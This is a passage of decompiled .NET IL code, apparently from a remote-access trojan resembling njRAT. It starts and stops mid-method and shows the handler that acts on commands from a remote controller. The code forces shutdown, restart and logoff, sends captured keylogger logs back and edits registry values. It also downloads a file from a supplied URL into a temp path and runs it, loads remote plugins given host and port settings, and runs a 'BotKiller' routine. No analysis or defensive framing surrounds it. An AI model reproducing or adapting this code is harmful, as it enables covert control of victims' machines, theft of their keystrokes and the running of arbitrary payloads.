      IL_0dd2:  leave      IL_1ae9

      IL_0dd7:  ldstr      "fun"
      IL_0ddc:  call       bool j.OK::Send(string)
      IL_0de1:  pop
      IL_0de2:  leave      IL_1ae9

      IL_0de7:  ldc.i4.1
      IL_0de8:  newarr     [mscorlib]System.String
      IL_0ded:  dup
      IL_0dee:  ldc.i4.0
      IL_0def:  ldloc.0
      IL_0df0:  ldc.i4.1
      IL_0df1:  ldelem.ref
      IL_0df2:  stelem.ref
      IL_0df3:  call       string [mscorlib]System.String::Concat(string[])
      IL_0df8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0dfd:  ldstr      "300"
      IL_0e02:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0e07:  call       void j.OK::Beep(int32,
                                           int32)
      IL_0e0c:  leave      IL_1ae9

      IL_0e11:  ldstr      "Shutdown"
      IL_0e16:  ldstr      "/s /t 00"
      IL_0e1b:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0e20:  pop
      IL_0e21:  leave      IL_1ae9

      IL_0e26:  ldstr      "Shutdown"
      IL_0e2b:  ldstr      "/r /t 00"
      IL_0e30:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0e35:  pop
      IL_0e36:  leave      IL_1ae9

      IL_0e3b:  ldstr      "Shutdown"
      IL_0e40:  ldstr      "/l /f"
      IL_0e45:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0e4a:  pop
      IL_0e4b:  leave      IL_1ae9

      IL_0e50:  call       void BotKillers::RunStandardBotKiller()
      IL_0e55:  br         IL_0f2b

      IL_0e5a:  ldc.i4.0
      IL_0e5b:  stsfld     bool j.OK::Cn
      IL_0e60:  leave      IL_1ae9

      IL_0e65:  ldstr      "kl"
      IL_0e6a:  ldsfld     string j.OK::Y
      IL_0e6f:  ldsfld     class j.kl j.OK::kq
      IL_0e74:  ldflda     string j.kl::Logs
      IL_0e79:  call       string j.OK::ENB(string&)
      IL_0e7e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0e83:  call       bool j.OK::Send(string)
      IL_0e88:  pop
      IL_0e89:  leave      IL_1ae9

      IL_0e8e:  ldloc.0
      IL_0e8f:  ldc.i4.1
      IL_0e90:  ldelem.ref
      IL_0e91:  stloc.s    V_44
      IL_0e93:  ldloc.s    V_44
      IL_0e95:  ldstr      "~"
      IL_0e9a:  ldc.i4.0
      IL_0e9b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ea0:  brfalse.s  IL_0ec2

      IL_0ea2:  ldloc.s    V_44
      IL_0ea4:  ldstr      "!"
      IL_0ea9:  ldc.i4.0
      IL_0eaa:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0eaf:  brfalse.s  IL_0ed1

      IL_0eb1:  ldloc.s    V_44
      IL_0eb3:  ldstr      "@"
      IL_0eb8:  ldc.i4.0
      IL_0eb9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ebe:  brfalse.s  IL_0f1e

      IL_0ec0:  br.s       IL_0f26

      IL_0ec2:  ldloc.0
      IL_0ec3:  ldc.i4.2
      IL_0ec4:  ldelem.ref
      IL_0ec5:  ldloc.0
      IL_0ec6:  ldc.i4.3
      IL_0ec7:  ldelem.ref
      IL_0ec8:  ldc.i4.1
      IL_0ec9:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0ece:  pop
      IL_0ecf:  br.s       IL_0f26

      IL_0ed1:  ldloc.0
      IL_0ed2:  ldc.i4.2
      IL_0ed3:  ldelem.ref
      IL_0ed4:  ldloc.0
      IL_0ed5:  ldc.i4.3
      IL_0ed6:  ldelem.ref
      IL_0ed7:  ldc.i4.1
      IL_0ed8:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0edd:  pop
      IL_0ede:  ldstr      "getvalue"
      IL_0ee3:  ldsfld     string j.OK::Y
      IL_0ee8:  ldloc.0
      IL_0ee9:  ldc.i4.1
      IL_0eea:  ldelem.ref
      IL_0eeb:  ldsfld     string j.OK::Y
      IL_0ef0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0ef5:  ldloc.0
      IL_0ef6:  ldc.i4.1
      IL_0ef7:  ldelem.ref
      IL_0ef8:  ldstr      ""
      IL_0efd:  call       object j.OK::GTV(string,
                                            object)
      IL_0f02:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f07:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0f0c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f11:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0f16:  call       bool j.OK::Send(string)
      IL_0f1b:  pop
      IL_0f1c:  br.s       IL_0f26

      IL_0f1e:  ldloc.0
      IL_0f1f:  ldc.i4.2
      IL_0f20:  ldelem.ref
      IL_0f21:  call       void j.OK::DLV(string)
      IL_0f26:  leave      IL_1ae9

      IL_0f2b:  ldloc.2
      IL_0f2c:  ldstr      "rn"
      IL_0f31:  ldc.i4.0
      IL_0f32:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f37:  brtrue     IL_10e6

      IL_0f3c:  ldloc.0
      IL_0f3d:  ldc.i4.2
      IL_0f3e:  ldelem.ref
      IL_0f3f:  ldc.i4.0
      IL_0f40:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0f45:  ldc.i4.s   31
      IL_0f47:  bne.un     IL_0fcf

      .try
      {
        IL_0f4c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0f51:  ldloc.0
        IL_0f52:  ldc.i4.0
        IL_0f53:  ldelem.ref
        IL_0f54:  ldsfld     string j.OK::Y
        IL_0f59:  ldloc.0
        IL_0f5a:  ldc.i4.1
        IL_0f5b:  ldelem.ref
        IL_0f5c:  ldsfld     string j.OK::Y
        IL_0f61:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0f66:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0f6b:  stloc.s    V_45
        IL_0f6d:  dup
        IL_0f6e:  ldarg.0
        IL_0f6f:  ldloc.s    V_45
        IL_0f71:  ldarg.0
        IL_0f72:  ldlen
        IL_0f73:  conv.i4
        IL_0f74:  ldloc.s    V_45
        IL_0f76:  sub.ovf
        IL_0f77:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0f7c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0f81:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0f86:  stloc.1
        IL_0f87:  leave      IL_1026

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0f8c:  dup
        IL_0f8d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0f92:  stloc.s    V_46
        IL_0f94:  ldloc.s    V_46
        IL_0f96:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0f9b:  ldstr      "MSG"
        IL_0fa0:  ldsfld     string j.OK::Y
        IL_0fa5:  ldstr      "Execute ERROR"
        IL_0faa:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0faf:  call       bool j.OK::Send(string)
        IL_0fb4:  pop
        IL_0fb5:  ldstr      "bla"
        IL_0fba:  call       bool j.OK::Send(string)
        IL_0fbf:  pop
        IL_0fc0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fc5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fca:  leave      IL_1ae9

      }  // end handler
      IL_0fcf:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0fd4:  stloc.s    V_4
      .try
      {
        IL_0fd6:  ldloc.s    V_4
        IL_0fd8:  ldloc.0
        IL_0fd9:  ldc.i4.2
        IL_0fda:  ldelem.ref
        IL_0fdb:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0fe0:  stloc.1
        IL_0fe1:  leave.s    IL_1026

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0fe3:  dup
        IL_0fe4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0fe9:  stloc.s    V_47
        IL_0feb:  ldloc.s    V_47
        IL_0fed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ff2:  ldstr      "MSG"
        IL_0ff7:  ldsfld     string j.OK::Y
        IL_0ffc:  ldstr      "Download ERROR"
        IL_1001:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1006:  call       bool j.OK::Send(string)
        IL_100b:  pop
        IL_100c:  ldstr      "bla"
        IL_1011:  call       bool j.OK::Send(string)
        IL_1016:  pop
        IL_1017:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_101c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1021:  leave      IL_1ae9

      }  // end handler
      IL_1026:  ldstr      "bla"
      IL_102b:  call       bool j.OK::Send(string)
      IL_1030:  pop
      IL_1031:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1036:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_103b:  stloc.s    V_31
      IL_103d:  ldloca.s   V_31
      IL_103f:  constrained. [mscorlib]System.Guid
      IL_1045:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_104a:  ldstr      "-"
      IL_104f:  ldstr      ""
      IL_1054:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_1059:  ldstr      "."
      IL_105e:  ldloc.0
      IL_105f:  ldc.i4.1
      IL_1060:  ldelem.ref
      IL_1061:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1066:  stloc.s    V_5
      .try
      {
        IL_1068:  ldloc.s    V_5
        IL_106a:  ldloc.1
        IL_106b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1070:  ldloc.s    V_5
        IL_1072:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_1077:  pop
        IL_1078:  ldstr      "MSG"
        IL_107d:  ldsfld     string j.OK::Y
        IL_1082:  ldstr      "Executed As "
        IL_1087:  ldloc.s    V_5
        IL_1089:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_108e:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1093:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1098:  call       bool j.OK::Send(string)
        IL_109d:  pop
        IL_109e:  leave      IL_1ae9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_10a3:  dup
        IL_10a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_10a9:  stloc.s    V_48
        IL_10ab:  ldloc.s    V_48
        IL_10ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_10b2:  ldloc.s    V_48
        IL_10b4:  stloc.s    V_49
        IL_10b6:  ldstr      "MSG"
        IL_10bb:  ldsfld     string j.OK::Y
        IL_10c0:  ldstr      "Execute ERROR "
        IL_10c5:  ldloc.s    V_49
        IL_10c7:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_10cc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_10d1:  call       bool j.OK::Send(string)
        IL_10d6:  pop
        IL_10d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_10dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_10e1:  leave      IL_1ae9

      }  // end handler
      IL_10e6:  ldloc.2
      IL_10e7:  ldstr      "inv"
      IL_10ec:  ldc.i4.0
      IL_10ed:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10f2:  brfalse.s  IL_112c

      IL_10f4:  ldloc.2
      IL_10f5:  ldstr      "ret"
      IL_10fa:  ldc.i4.0
      IL_10fb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1100:  brfalse    IL_135d

      IL_1105:  ldloc.2
      IL_1106:  ldstr      "CAP"
      IL_110b:  ldc.i4.0
      IL_110c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1111:  brfalse    IL_14ce

      IL_1116:  ldloc.2
      IL_1117:  ldstr      "un"
      IL_111c:  ldc.i4.0
      IL_111d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1122:  brfalse    IL_1670

      IL_1127:  br         IL_16d8

      IL_112c:  ldloc.0
      IL_112d:  ldc.i4.1
      IL_112e:  ldelem.ref
      IL_112f:  ldc.i4.0
      IL_1130:  newarr     [mscorlib]System.Byte
      IL_1135:  call       object j.OK::GTV(string,
                                            object)
      IL_113a:  castclass  uint8[]
      IL_113f:  stloc.s    V_50
      IL_1141:  ldloc.0
      IL_1142:  ldc.i4.3
      IL_1143:  ldelem.ref
      IL_1144:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1149:  ldc.i4.s   10
      IL_114b:  clt
      IL_114d:  ldloc.s    V_50
      IL_114f:  ldlen
      IL_1150:  conv.i4
      IL_1151:  ldc.i4.0
      IL_1152:  ceq
      IL_1154:  and
      IL_1155:  brfalse.s  IL_1194

      IL_1157:  ldc.i4.5
      IL_1158:  newarr     [mscorlib]System.String
      IL_115d:  dup
      IL_115e:  ldc.i4.0
      IL_115f:  ldstr      "pl"
      IL_1164:  stelem.ref
      IL_1165:  dup
      IL_1166:  ldc.i4.1
      IL_1167:  ldsfld     string j.OK::Y
      IL_116c:  stelem.ref
      IL_116d:  dup
      IL_116e:  ldc.i4.2
      IL_116f:  ldloc.0
      IL_1170:  ldc.i4.1
      IL_1171:  ldelem.ref
      IL_1172:  stelem.ref
      IL_1173:  dup
      IL_1174:  ldc.i4.3
      IL_1175:  ldsfld     string j.OK::Y
      IL_117a:  stelem.ref
      IL_117b:  dup
      IL_117c:  ldc.i4.4
      IL_117d:  ldc.i4.1
      IL_117e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1183:  stelem.ref
      IL_1184:  call       string [mscorlib]System.String::Concat(string[])
      IL_1189:  call       bool j.OK::Send(string)
      IL_118e:  pop
      IL_118f:  br         IL_1358

      IL_1194:  ldloc.0
      IL_1195:  ldc.i4.3
      IL_1196:  ldelem.ref
      IL_1197:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_119c:  ldc.i4.s   10
      IL_119e:  ble.s      IL_120d

      IL_11a0:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_11a5:  stloc.s    V_52
      IL_11a7:  ldc.i4.6
      IL_11a8:  newarr     [mscorlib]System.String
      IL_11ad:  dup
      IL_11ae:  ldc.i4.0
      IL_11af:  ldloc.0
      IL_11b0:  ldc.i4.0
      IL_11b1:  ldelem.ref
      IL_11b2:  stelem.ref
      IL_11b3:  dup
      IL_11b4:  ldc.i4.1
      IL_11b5:  ldsfld     string j.OK::Y
      IL_11ba:  stelem.ref
      IL_11bb:  dup
      IL_11bc:  ldc.i4.2
      IL_11bd:  ldloc.0
      IL_11be:  ldc.i4.1
      IL_11bf:  ldelem.ref
      IL_11c0:  stelem.ref
      IL_11c1:  dup
      IL_11c2:  ldc.i4.3
      IL_11c3:  ldsfld     string j.OK::Y
      IL_11c8:  stelem.ref
      IL_11c9:  dup
      IL_11ca:  ldc.i4.4
      IL_11cb:  ldloc.0
      IL_11cc:  ldc.i4.2
      IL_11cd:  ldelem.ref
      IL_11ce:  stelem.ref
      IL_11cf:  dup
      IL_11d0:  ldc.i4.5
      IL_11d1:  ldsfld     string j.OK::Y
      IL_11d6:  stelem.ref
      IL_11d7:  call       string [mscorlib]System.String::Concat(string[])
      IL_11dc:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_11e1:  stloc.s    V_53
      IL_11e3:  ldloc.s    V_52
      IL_11e5:  ldarg.0
      IL_11e6:  ldloc.s    V_53
      IL_11e8:  ldarg.0
      IL_11e9:  ldlen
      IL_11ea:  conv.i4
      IL_11eb:  ldloc.s    V_53
      IL_11ed:  sub.ovf
      IL_11ee:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_11f3:  ldloc.s    V_52
      IL_11f5:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_11fa:  call       uint8[] j.OK::ZIP(uint8[])
      IL_11ff:  stloc.s    V_50
      IL_1201:  ldloc.0
      IL_1202:  ldc.i4.1
      IL_1203:  ldelem.ref
      IL_1204:  ldloc.s    V_50
      IL_1206:  ldc.i4.3
      IL_1207:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_120c:  pop
      IL_120d:  ldc.i4.5
      IL_120e:  newarr     [mscorlib]System.String
      IL_1213:  dup
      IL_1214:  ldc.i4.0
      IL_1215:  ldstr      "pl"
      IL_121a:  stelem.ref
      IL_121b:  dup
      IL_121c:  ldc.i4.1
      IL_121d:  ldsfld     string j.OK::Y
      IL_1222:  stelem.ref
      IL_1223:  dup
      IL_1224:  ldc.i4.2
      IL_1225:  ldloc.0
      IL_1226:  ldc.i4.1
      IL_1227:  ldelem.ref
      IL_1228:  stelem.ref
      IL_1229:  dup
      IL_122a:  ldc.i4.3
      IL_122b:  ldsfld     string j.OK::Y
      IL_1230:  stelem.ref
      IL_1231:  dup
      IL_1232:  ldc.i4.4
      IL_1233:  ldc.i4.0
      IL_1234:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1239:  stelem.ref
      IL_123a:  call       string [mscorlib]System.String::Concat(string[])
      IL_123f:  call       bool j.OK::Send(string)
      IL_1244:  pop
      IL_1245:  ldloc.s    V_50
      IL_1247:  ldstr      "A"
      IL_124c:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1251:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1256:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_125b:  stloc.s    V_51
      IL_125d:  ldloc.s    V_51
      IL_125f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1264:  ldnull
      IL_1265:  ldstr      "h"
      IL_126a:  ldc.i4.1
      IL_126b:  newarr     [mscorlib]System.Object
      IL_1270:  dup
      IL_1271:  ldc.i4.0
      IL_1272:  ldsfld     string j.OK::H
      IL_1277:  stelem.ref
      IL_1278:  ldnull
      IL_1279:  ldnull
      IL_127a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_127f:  ldloc.s    V_51
      IL_1281:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1286:  ldnull
      IL_1287:  ldstr      "p"
      IL_128c:  ldc.i4.1
      IL_128d:  newarr     [mscorlib]System.Object
      IL_1292:  dup
      IL_1293:  ldc.i4.0
      IL_1294:  ldsfld     string j.OK::P
      IL_1299:  stelem.ref
      IL_129a:  ldnull
      IL_129b:  ldnull
      IL_129c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_12a1:  ldloc.s    V_51
      IL_12a3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_12a8:  ldnull
      IL_12a9:  ldstr      "osk"
      IL_12ae:  ldc.i4.1
      IL_12af:  newarr     [mscorlib]System.Object
      IL_12b4:  dup
      IL_12b5:  ldc.i4.0
      IL_12b6:  ldloc.0
      IL_12b7:  ldc.i4.2
      IL_12b8:  ldelem.ref
      IL_12b9:  stelem.ref
      IL_12ba:  ldnull
      IL_12bb:  ldnull
      IL_12bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_12c1:  ldloc.s    V_51
      IL_12c3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_12c8:  ldnull
      IL_12c9:  ldstr      "start"
      IL_12ce:  ldc.i4.0
      IL_12cf:  newarr     [mscorlib]System.Object
      IL_12d4:  ldnull
      IL_12d5:  ldnull
      IL_12d6:  ldnull
      IL_12d7:  ldc.i4.1
      IL_12d8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_12dd:  pop
      IL_12de:  br.s       IL_12e6

      IL_12e0:  ldc.i4.1
      IL_12e1:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_12e6:  ldsfld     bool j.OK::Cn
      IL_12eb:  ldc.i4.0
      IL_12ec:  ceq
      IL_12ee:  box        [mscorlib]System.Boolean
      IL_12f3:  ldloc.s    V_51
      IL_12f5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_12fa:  ldnull
      IL_12fb:  ldstr      "Off"
      IL_1300:  ldc.i4.0
      IL_1301:  newarr     [mscorlib]System.Object
      IL_1306:  ldnull
      IL_1307:  ldnull
      IL_1308:  ldnull
      IL_1309:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_130e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1313:  ldc.i4.1
      IL_1314:  box        [mscorlib]System.Boolean
      IL_1319:  ldc.i4.0
      IL_131a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_131f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1324:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_1329:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_132e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1333:  brfalse.s  IL_12e0

      IL_1335:  ldloc.s    V_51
      IL_1337:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_133c:  ldnull
      IL_133d:  ldstr      "off"
      IL_1342:  ldc.i4.1
      IL_1343:  newarr     [mscorlib]System.Object
      IL_1348:  dup
      IL_1349:  ldc.i4.0
      IL_134a:  ldc.i4.1
      IL_134b:  box        [mscorlib]System.Boolean
      IL_1350:  stelem.ref
      IL_1351:  ldnull
      IL_1352:  ldnull
      IL_1353:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1358:  leave      IL_1ae9

      IL_135d:  ldloc.0
      IL_135e:  ldc.i4.1
      IL_135f:  ldelem.ref
      IL_1360:  ldc.i4.0
      IL_1361:  newarr     [mscorlib]System.Byte
      IL_1366:  call       object j.OK::GTV(string,
                                            object)
      IL_136b:  castclass  uint8[]
      IL_1370:  stloc.s    V_54
      IL_1372:  ldloc.0
      IL_1373:  ldc.i4.2
      IL_1374:  ldelem.ref
      IL_1375:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_137a:  ldc.i4.s   10
      IL_137c:  clt
      IL_137e:  ldloc.s    V_54
      IL_1380:  ldlen
      IL_1381:  conv.i4
      IL_1382:  ldc.i4.0
      IL_1383:  ceq
      IL_1385:  and
      IL_1386:  brfalse.s  IL_13c5

      IL_1388:  ldc.i4.5
      IL_1389:  newarr     [mscorlib]System.String
      IL_138e:  dup
      IL_138f:  ldc.i4.0
      IL_1390:  ldstr      "pl"
      IL_1395:  stelem.ref
      IL_1396:  dup
      IL_1397:  ldc.i4.1
      IL_1398:  ldsfld     string j.OK::Y
      IL_139d:  stelem.ref
      IL_139e:  dup
      IL_139f:  ldc.i4.2
      IL_13a0:  ldloc.0
      IL_13a1:  ldc.i4.1
      IL_13a2:  ldelem.ref
      IL_13a3:  stelem.ref
      IL_13a4:  dup
      IL_13a5:  ldc.i4.3
      IL_13a6:  ldsfld     string j.OK::Y
      IL_13ab:  stelem.ref
      IL_13ac:  dup
      IL_13ad:  ldc.i4.4
      IL_13ae:  ldc.i4.1
      IL_13af:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_13b4:  stelem.ref
      IL_13b5:  call       string [mscorlib]System.String::Concat(string[])
      IL_13ba:  call       bool j.OK::Send(string)
      IL_13bf:  pop
      IL_13c0:  br         IL_14c9

      IL_13c5:  ldloc.0
      IL_13c6:  ldc.i4.2
      IL_13c7:  ldelem.ref
      IL_13c8:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_13cd:  ldc.i4.s   10
      IL_13cf:  ble.s      IL_1419

      IL_13d1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_13d6:  ldloc.0
      IL_13d7:  ldc.i4.0
      IL_13d8:  ldelem.ref
      IL_13d9:  ldsfld     string j.OK::Y
      IL_13de:  ldloc.0
      IL_13df:  ldc.i4.1
      IL_13e0:  ldelem.ref
      IL_13e1:  ldsfld     string j.OK::Y
      IL_13e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_13eb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_13f0:  stloc.s    V_56
      IL_13f2:  dup
      IL_13f3:  ldarg.0
      IL_13f4:  ldloc.s    V_56
      IL_13f6:  ldarg.0
      IL_13f7:  ldlen
      IL_13f8:  conv.i4
      IL_13f9:  ldloc.s    V_56
      IL_13fb:  sub.ovf
      IL_13fc:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1401:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1406:  call       uint8[] j.OK::ZIP(uint8[])
      IL_140b:  stloc.s    V_54
      IL_140d:  ldloc.0
      IL_140e:  ldc.i4.1
      IL_140f:  ldelem.ref
      IL_1410:  ldloc.s    V_54
      IL_1412:  ldc.i4.3
      IL_1413:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1418:  pop
      IL_1419:  ldc.i4.5
      IL_141a:  newarr     [mscorlib]System.String
      IL_141f:  dup
